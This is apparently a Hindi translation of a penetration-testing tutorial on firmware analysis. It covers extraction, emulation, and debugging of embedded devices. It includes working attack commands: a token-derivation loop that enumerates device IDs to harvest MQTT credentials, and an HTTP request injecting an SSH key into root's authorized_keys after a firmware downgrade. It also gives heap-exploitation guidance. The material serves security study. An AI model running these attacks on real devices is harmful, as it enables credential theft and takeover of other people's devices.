# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक सॉफ़्टवेयर है, जो hardware components और उपयोगकर्ताओं के साथ इंटरैक्ट करने वाले software के बीच संचार को प्रबंधित और सुगम बनाकर devices को सही ढंग से काम करने में सक्षम बनाता है। यह स्थायी memory में संग्रहीत होता है, जिससे device चालू होते ही महत्वपूर्ण निर्देशों तक पहुँच सकता है और operating system लॉन्च हो सकता है। Security vulnerabilities की पहचान करने के लिए Firmware की जाँच करना और संभावित रूप से उसमें बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी जुटाना**

**जानकारी जुटाना** किसी device की संरचना और उसमें उपयोग की गई technologies को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में निम्नलिखित के बारे में डेटा एकत्र किया जाता है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader से जुड़ी जानकारी
- Hardware layout और datasheets
- Codebase के मेट्रिक्स और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architecture और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस उद्देश्य के लिए **open-source intelligence (OSINT)** tools बेहद उपयोगी हैं। उपलब्ध open-source software components का manual और automated review के ज़रिए विश्लेषण भी उतना ही उपयोगी है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools मुफ़्त static analysis उपलब्ध कराते हैं, जिनका उपयोग संभावित समस्याएँ ढूँढ़ने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, और हर तरीके की जटिलता अलग-अलग होती है:

- स्रोत (developers, manufacturers) से **सीधे**
- दिए गए निर्देशों के अनुसार **बिल्ड करके**
- आधिकारिक support sites से **डाउनलोड करके**
- होस्ट की गई Firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** तक सीधे पहुँचकर
- man-in-the-middle techniques के ज़रिए **updates को intercept करके**
- **UART**, **JTAG**, या **PICit** जैसे connections के ज़रिए device से **निकालकर**
- Device communication में update requests को **sniff करके**
- **Hardcoded update endpoints** की पहचान करके और उनका उपयोग करके
- Bootloader या network से **dump करके**
- बाकी सभी तरीके विफल होने पर, उपयुक्त hardware tools का उपयोग करके storage chip को **निकालकर और पढ़कर**

### केवल UART logs: Flash में U-Boot env के ज़रिए root shell को force करना

अगर UART RX को अनदेखा किया जाता है (सिर्फ logs मिलते हैं), तो भी आप offline **U-Boot environment blob को edit करके** init shell force कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) से SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` को संपादित करके उसमें `init=/bin/sh` शामिल करें, और blob के लिए **U-Boot env CRC32 फिर से गणना करें**।
3. केवल env partition को फिर से flash करें और reboot करें; UART पर एक shell दिखाई देना चाहिए।

यह उन embedded devices पर उपयोगी है जहाँ bootloader shell disabled है, लेकिन external flash access के ज़रिए env partition में लिखा जा सकता है।

## फर्मवेयर का विश्लेषण

अब जब **आपके पास फर्मवेयर है**, तो आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि उसके साथ कैसे काम करना है। इसके लिए आप अलग-अलग tools का उपयोग कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर इन tools से ज़्यादा जानकारी न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। अगर entropy कम है, तो संभवतः यह encrypted नहीं है। अगर entropy ज़्यादा है, तो संभवतः यह encrypted है (या किसी तरह compressed है)।

इसके अलावा, firmware के **अंदर embedded files** extract करने के लिए आप इन tools का इस्तेमाल कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file की जाँच करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का इस्तेमाल कर सकते हैं।

### Filesystem प्राप्त करना

ऊपर बताए गए `binwalk -ev <bin>` जैसे tools से आप **filesystem extract** कर पाए होंगे।\
Binwalk आम तौर पर इसे **filesystem के प्रकार के नाम वाले folder** में extract करता है, जो आम तौर पर इनमें से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Filesystem को मैन्युअल रूप से Extract करना

कभी-कभी binwalk के signatures में filesystem का **magic byte** नहीं होता। ऐसे मामलों में, binwalk का इस्तेमाल करके **filesystem का offset खोजें और compressed filesystem को binary से carve करें**, फिर नीचे दिए गए steps के अनुसार उसके प्रकार के आधार पर filesystem को **मैन्युअल रूप से extract करें**।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्न कमांड भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में इस्तेमाल किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" डायरेक्टरी में होंगी।

- CPIO archive फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware का विश्लेषण

Firmware प्राप्त हो जाने के बाद, उसकी संरचना और संभावित vulnerabilities को समझने के लिए उसका विश्लेषण करना आवश्यक है। इस प्रक्रिया में firmware image से उपयोगी डेटा का विश्लेषण और निष्कर्षण करने के लिए विभिन्न tools का उपयोग किया जाता है।

### शुरुआती विश्लेषण के Tools

Binary फ़ाइल (जिसे `<bin>` कहा गया है) के शुरुआती निरीक्षण के लिए कमांड का एक सेट दिया गया है। ये कमांड फ़ाइल के प्रकार की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem की जानकारी समझने में मदद करते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की **encryption** स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy, encryption की कमी का संकेत देती है, जबकि अधिक entropy संभावित encryption या compression दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइलों की जाँच के लिए **binvis.io** जैसे tools और resources की सलाह दी जाती है।

### फ़ाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर फ़ाइल सिस्टम निकाला जा सकता है, जो अक्सर फ़ाइल सिस्टम के प्रकार के नाम वाली directory में होता है (जैसे, squashfs, ubifs)। हालाँकि, magic bytes मौजूद न होने के कारण जब **binwalk** फ़ाइल सिस्टम के प्रकार को पहचानने में विफल रहता है, तो उसे manually निकालना आवश्यक होता है। इसमें फ़ाइल सिस्टम का offset खोजने के लिए `binwalk` का उपयोग करना और फिर फ़ाइल सिस्टम को carve out करने के लिए `dd` command चलाना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, filesystem के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, contents को manually extract करने के लिए अलग-अलग commands इस्तेमाल की जाती हैं।

### Filesystem Analysis

Filesystem extract होने के बाद, security flaws की खोज शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

जाँचने के लिए **प्रमुख स्थानों** और **items** में शामिल हैं:

- User credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- आम IoT device web servers और binaries

Filesystem में sensitive information और vulnerabilities खोजने में कई tools मदद करते हैं:

- Sensitive information खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिले source code और compiled binaries, दोनों की vulnerabilities के लिए जाँच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools ऐसे unprotected binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के ज़रिए cloud config और MQTT credentials हासिल करना

कई IoT hubs हर device के लिए configuration ऐसे cloud endpoint से fetch करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID से locally, hardcoded secret का इस्तेमाल करके derive किया जाता है। उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और uppercase hex के रूप में दर्शाया जाता है

इस design की मदद से, deviceId और STATIC_KEY जानने वाला कोई भी व्यक्ति URL को फिर से बना सकता है और cloud config हासिल कर सकता है, जिसमें अक्सर plaintext MQTT credentials और topic prefixes सामने आ जाते हैं।

व्यावहारिक workflow:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) connect करें और logs capture करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- ऐसी पंक्तियाँ खोजें जो cloud config URL pattern और broker address प्रिंट करती हों, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm निकालें

- binaries को Ghidra/radare2 में load करें और config path ("/pf/") या MD5 usage खोजें।
- algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token निकालें और digest को uppercase करें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config और MQTT credentials हासिल करें

- URL बनाएं और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT और weak topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- recovered credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील घटनाओं पर नज़र रखें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की सूची बनाएं (बड़े पैमाने पर, अनुमति के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक क्रमिक suffix होता है।
- आप संभावित IDs को क्रम से आज़मा सकते हैं, tokens बना सकते हैं और प्रोग्राम के ज़रिए configs प्राप्त कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets प्राप्त करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** करने में सक्षम बनाती है। इस तरीके में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से बने virtual machine में transfer करने से आगे की testing आसान हो सकती है।

### Individual Binaries को Emulate करना

Single programs की जाँच के लिए, उनके endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, इस command का उपयोग किया जा सकता है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` उपयुक्त विकल्प है।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है, जिसमें emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools पूर्ण firmware emulation को संभव बनाते हैं, प्रक्रिया को automate करते हैं और dynamic analysis में सहायता करते हैं।

### Emulation के लिए split और verified root filesystems का पुनर्निर्माण

यदि SquashFS superblock पढ़ने योग्य है, लेकिन inode, directory या fragment-table offsets असंभव लगते हैं, तो तुरंत `unsquashfs` को patch न करें। शुरुआती boot binary को reverse करें और उसके द्वारा बनाए गए block-device graph को दोबारा तैयार करें: embedded systems में nominal root partition दिख सकता है, लेकिन वास्तविक filesystem `dm-linear` mapping से बनाया जा सकता है, जो किसी दूसरे partition से लिए गए sectors को जोड़ता है। केवल superblock की जाँच सफल हो सकती है, भले ही बाद के सभी metadata blocks खिसके हुए हों।<sup>[[9]](#references)</sup>

Firmware की arithmetic को बिल्कुल उसी तरह बनाए रखें। विशेष रूप से, पहचानें कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को उनके मूल क्रम में दोहराएँ; और A/B layouts में bank पर निर्भर tail regions का हिसाब रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले 4 KiB boundary तक truncate करता है और उसके बाद परिणाम को 512-byte sectors में व्यक्त करता है; इसे `partition_bytes // 512` से बदलने पर appended extent कुछ kilobytes तक खिसक सकता है और सभी downstream SquashFS tables corrupt हो सकती हैं।<sup>[[9]](#references)</sup>

जाँच के लिए उपयोगी workflow:<sup>[[9]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length पता करें।
2. Alignment semantics बदले बिना extents को concatenate या map करें।
3. यदि extraction फिर भी विफल हो, तो अनुमानित boundary के आसपास केवल एक छोटा window खोजें और अकेले संभावित superblock को स्वीकार करने के बजाय लगातार कई वैध metadata structures की पुष्टि करें।
4. Reconstructed image पर बिना बदलाव वाला `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` से अधिक ठोस प्रमाण है।

#### Analyst-नियंत्रित dm-verity replacement

जब analyst के नियंत्रण में QEMU kernel, initramfs और virtual disks हों, तब vendor के verification PID 1 को एक छोटे statically linked init से बदलकर modified root boot किया जा सकता है। यह **lab boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[9]](#references)</sup>

Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करना, `setsid()` call करना, `/dev/console` को file descriptors 0–2 से connect करना, `/proc` और `/sys` mount करना, दिए गए block device के आने तक प्रतीक्षा करना, edited root को read-only mount करना, पुराने root के pseudo-filesystems detach करना, नए mount को `/` पर ले जाना, `chroot` करना और firmware के मूल `/sbin/init` को `execve()` करना। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root से जुड़े mount points गलती से detach नहीं होते।<sup>[[9]](#references)</sup>

Mutable device state को modified immutable root से अलग रखें। qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरी read-only virtio disk edited SquashFS उपलब्ध करा सकती है:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### ऑफ़लाइन image-state debugging

जब धीमे boot, विनाशकारी startup scripts या अविश्वसनीय console logging के कारण विफलता का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। किसी running VM द्वारा उपयोग किए जा रहे overlay को कभी attach न करें; उसे `qemu-nbd` से expose करें, LVM discovery को इच्छित NBD partition तक सीमित रखें और disconnect करने से पहले volume group को deactivate करें।<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

दोहराए जा सकने वाले fault isolation के लिए, timestamp वाले marker files किसी स्थिर writable volume में लिखें और उन्हें offline सत्यापित करें; rate limiting या process के समय से पहले बंद होने के कारण `/dev/kmsg`, FIFOs और अस्थायी consoles से गलत negative नतीजे मिल सकते हैं। असंबंधित code बदलने से पहले, अलग-अलग layers के exact interfaces की तुलना भी करें: `uname -r` बनाम `/lib/modules/`, disk पर मौजूद ext4 features बनाम kernel configuration, और Mesa `libGL` generation बनाम DRI driver ABI तथा PCI से निकले driver names। कोई component मौजूद हो सकता है और `dlopen()` सफलतापूर्वक कर सकता है, फिर भी अनुपयोगी रह सकता है क्योंकि उसका consumer अलग ABI की अपेक्षा करता है।<sup>[[9]](#references)</sup>

## व्यवहार में Dynamic Analysis

इस चरण में analysis के लिए वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation शायद hardware interactions की पूरी तरह सही नकल न करे, इसलिए कभी-कभी emulation को फिर से शुरू करना पड़ सकता है। Analysis में filesystem की दोबारा जाँच, exposed webpages और network services का exploit करना, और bootloader vulnerabilities की पड़ताल शामिल होनी चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment में उससे interact किया जाता है। इसमें breakpoints सेट करने और fuzzing तथा अन्य techniques के ज़रिए vulnerabilities पहचानने के लिए gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग होता है।

पूर्ण debugger के बिना embedded targets के लिए, **device पर statically-linked `gdbserver` कॉपी करें और remotely attach करें:**<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को forward किया गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture से एक के बजाय दो reversing targets बनते हैं। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो इनका पता लगाएँ:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से केवल controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download phases के दौरान reachable होते हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जाँचें कि target अभी भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है या नहीं। यदि ऐसा है, तो commissioning traffic sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस जोखिम को कम करते हैं, इसलिए ध्यान दें कि परीक्षण किया गया device वास्तव में उन्हें लागू करता है या नहीं।

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- Command dispatcher को reverse करें, जब तक **vendor-only handler** न मिल जाए।
- **FSM state**, **event**, **check**, **action** और **next-state** tables का पता लगाएँ।
- उन **transitional states** की पहचान करें जो अपने-आप आगे बढ़ते हैं, और उन retry/error branches की भी जो अंततः attacker-controlled state को reset या free करती हैं।
- यह पुष्टि करें कि daemon को vulnerable state तक पहुँचाने के लिए कौन-से legitimate protocol exchanges ज़रूरी हैं; यह न मानें कि buggy handler हमेशा reachable होता है।

Timing-sensitive protocols के लिए, Python framework से packet replay करना बहुत धीमा हो सकता है। एक अधिक भरोसेमंद तरीका है कि real hardware (उदाहरण के लिए **nRF52840**) पर vendor-grade stack के साथ legitimate device emulate किया जाए, ताकि सही **endpoints**, **attributes** और commissioning timing उपलब्ध कराई जा सके।

### Embedded daemons में fragmented-download bug class

एक बार-बार दिखने वाली firmware bug class **fragmented blob/model/configuration downloads** में सामने आती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields को validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy में `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग होता है, लेकिन इसे **मूल allocated size** के विरुद्ध check नहीं किया जाता।

इससे attacker ये कर सकता है:

- छोटा heap allocation करवाने के लिए **छोटे** घोषित total size वाला पहला valid fragment भेजना।
- बाद में **अपेक्षित offset** लेकिन बड़े `chunk_len` वाला fragment भेजना।
- ऐसा forged packet-local size देना जो नए checks को पूरा करे, लेकिन फिर भी मूल allocated buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो malformed fragments भेजने से पहले target को अपेक्षित model-download या blob-download state तक पहुँचाने के लिए exploit में पर्याप्त **device emulation** शामिल होना चाहिए।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि **protocol की अपनी error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में धकेलने के लिए malformed follow-up fragments भेजें।
- Retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free करे।
- Process के असंबंधित कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस अनुमानित `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-like** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहाँ chunk metadata corrupt करने से unlink/unbin logic write primitive में बदल सकता है। एक स्थिर तरीका है **size field** को corrupt करके allocator traversal को overflowed buffer के भीतर रखे गए **fake chunks** की ओर मोड़ना, बजाय इसके कि real bin pointers को तुरंत overwrite करके process crash कर दिया जाए।

## Binary Exploitation and Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming की आवश्यकता होती है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques आवश्यक हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc की तरह fastbins का उपयोग करता है। बाद का कोई बड़ा allocation `__malloc_consolidate()` trigger कर सकता है, इसलिए किसी भी fake chunk को checks (उचित size, `fd = 0` और आसपास के chunks का "in use" दिखना) पास करने होंगे।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** यदि ASLR enabled है, लेकिन मुख्य binary **non-PIE** है, तो binary के अंदर `.data/.bss` addresses स्थिर रहते हैं। आप उस region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation **function pointer table** पर पहुँच जाए।
- **Parser-stopping NUL:** JSON parse होने पर, payload में `\x00` parsing रोक सकता है, जबकि stack pivot/ROP chain के लिए attacker-controlled bytes पीछे बने रहते हैं।
- **`/proc/self/mem` के ज़रिए shellcode:** `open("/proc/self/mem")`, `lseek()` और `write()` call करने वाली ROP chain किसी ज्ञात mapping में executable shellcode रख सकती है और उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments प्रदान करते हैं, जिनमें आवश्यक tools मौजूद होते हैं।

## Firmware का विश्लेषण करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी सहायता करना है। यह सभी आवश्यक tools के साथ pre-configured environment देकर आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से लोड हैं।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

भले ही कोई vendor firmware images के लिए cryptographic signature checks लागू करता हो, **version rollback (downgrade) protection अक्सर मौजूद नहीं होती**। जब boot- या recovery-loader embedded public key से केवल signature verify करता है, लेकिन flash की जा रही image का *version* (या monotonic counter) compare नहीं करता, तो attacker वैध रूप से **पुराना, vulnerable firmware, जिस पर अब भी valid signature हो, install** कर सकता है और इस तरह patched vulnerabilities को फिर से ला सकता है।<sup>[[4]](#references)</sup>

आम attack workflow:

1. **पुरानी signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से extract करें (उदाहरण के लिए Android APK के अंदर `assets/firmware/` से)।
   * इसे VirusTotal, Internet archives, forums आदि जैसे third-party repositories से प्राप्त करें।
2. किसी भी उपलब्ध update channel के ज़रिए image को device पर **upload करें या उपलब्ध कराएँ**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में *unauthenticated* HTTP(S) endpoints होते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद ऐसी vulnerability exploit करें जिसे newer release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence हासिल करने के बाद, पहचान से बचने के लिए वैकल्पिक रूप से latest image को वापस flash करें या updates disable कर दें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

कमज़ोर (downgrade किए गए) firmware में, `md5` parameter को बिना sanitise किए सीधे shell command में जोड़ दिया जाता है, जिससे मनमाने commands inject किए जा सकते हैं (यहाँ — SSH key-based root access सक्षम करना)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने से यह fix बेअसर हो जाता है।<sup>[[4]](#references)</sup>

